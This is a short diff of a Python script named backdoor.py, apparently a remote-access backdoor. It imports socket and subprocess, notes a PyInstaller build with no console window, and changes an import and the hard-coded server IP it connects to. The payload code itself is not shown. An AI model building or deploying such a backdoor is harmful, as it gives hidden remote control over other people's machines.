@@ -2,7 +2,7 @@
 
 import socket
 import subprocess
-from modules.my_utils import show_message
+from myUtils import show_message
 
 """
 
@@ -15,7 +15,7 @@ pyinstaller --noconsole --onefile backdoor.py
 
 ### Variables & Constants ####################################################################################################
 
-server_ip = "10.32.99.36" # Put the server IP right here
+server_ip = "10.32.8.57" # Put the server IP right here
 
 ### Functions ################################################################################################################
 
